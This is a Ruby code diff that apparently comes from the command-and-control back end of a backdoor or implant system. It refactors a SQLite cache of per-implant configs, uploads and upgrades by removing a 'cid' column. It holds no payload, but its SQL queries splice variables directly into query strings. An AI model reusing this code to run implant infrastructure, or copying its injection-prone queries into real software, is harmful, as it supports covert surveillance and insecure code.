@@ -25,7 +25,7 @@ class DBCache
     schema = ["CREATE TABLE backdoor_signature (signature CHAR(32))",
               "CREATE TABLE network_signature (signature CHAR(32))",
               "CREATE TABLE class_keys (id CHAR(16), key CHAR(32))",
-              "CREATE TABLE configs (bid INT, cid INT, config BLOB)",
+              "CREATE TABLE configs (bid INT, config BLOB)",
               "CREATE TABLE uploads (bid INT, uid INT, filename TEXT, content BLOB)",
               "CREATE TABLE upgrade (bid INT, uid INT, filename TEXT, content BLOB)",
               "CREATE TABLE downloads (bid INT, did INT, filename TEXT)",
@@ -192,7 +192,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT cid FROM configs WHERE bid = #{bid};")
+      ret = db.execute("SELECT bid FROM configs WHERE bid = #{bid};")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -206,23 +206,23 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT cid, config FROM configs WHERE bid = #{bid};")
+      ret = db.execute("SELECT config FROM configs WHERE bid = #{bid};")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
     end
 
-    # return the first row (cid, config)
-    return *ret.first
+    # return only the config content
+    return ret.first.first
   end
 
-  def self.save_conf(bid, cid, config)
+  def self.save_conf(bid, config)
     # ensure the db was already created, otherwise create it
     create! unless File.exist?(CACHE_FILE)
     
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("INSERT INTO configs VALUES (#{bid}, #{cid}, ? )", SQLite3::Blob.new(config))
+      db.execute("INSERT INTO configs VALUES (#{bid}, ? )", SQLite3::Blob.new(config))
       db.close
     rescue Exception => e
       trace :warn, "Cannot save the cache: #{e.message}"
